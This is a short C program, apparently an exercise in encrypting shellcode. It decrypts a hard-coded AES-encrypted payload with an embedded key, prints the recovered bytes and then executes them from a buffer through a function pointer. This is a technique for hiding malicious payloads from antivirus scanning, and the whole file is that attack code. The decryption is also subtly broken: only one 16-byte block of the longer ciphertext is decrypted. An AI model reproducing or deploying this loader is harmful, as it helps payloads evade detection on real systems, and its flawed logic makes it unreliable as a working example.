#include<stdio.h>
#include<stdlib.h>
#include<string.h>
#include"openssl/aes.h"

int main(int argc, char* argv[])
{
    AES_KEY aesKey_;
    unsigned char Key[16];
    unsigned char shellcode[256] = {0};
    strcpy((char *) Key,"012345678912345");

    unsigned char ciphertext[] = \
"\x1d\xe4\x6f\xcd\xbe\x34\xfb\x22\x4b\x2f\xc1\x8\x6\x77\x4e\x6f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x31\x32\x33\x34\x35\x36\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x31\x32\x33\x34\x35\x36\x29\xa7\x37\xf0\x1d\x92\x1\xc7\x25\xab\x30\xf5\x16\x9f\x5\xc3\xf0\xcc\x19\xb7\xed\x5e\x18\x70\xc8\xf5\x28\x85\xde\x6a\x2d\x46\xf6\x14\x43\xaa\x1b\x4a\x5b\xda\xd3\xbf\x73\x5f\xd\xd5\x5e\x19\xfd\x4c\x97\x7d\xe6\x6\xcc\xa7\x35\xb9\xbf\xf8\x38\x6c\xe1\xe1\xbd\xb4\x6f\x7a\x5b\xb2\xa3\xdd\x6e\xb\x1c\x25\x56\x67\xfd\xc4\x18\xe0\x73\xcb\x43\x52\xd0\x16\x2d\x59\xcc\x33\x7b\x3e\x31\xf7\xea\x27\x1b\xea\xa9\x75\xcb\xfc\x84\x2c\x7\xcf\xff\x12\x36\x38\xa3\x22\x1c\xfc\xa\x57\xd7";

    AES_set_decrypt_key(Key, 128, &aesKey_);
    AES_decrypt(ciphertext, shellcode, &aesKey_);	  
	
    printf("[*] Shellcode Length:  %d\n", strlen(shellcode));
    printf("[*] Recovered Original Shellcode: \n");

    for (int i = 0; i < strlen(shellcode); i++) {
	    
	    printf("\\x%x", shellcode[i]);
         
    }

    int (*ret)() = (int(*)())shellcode;
    
    ret();

}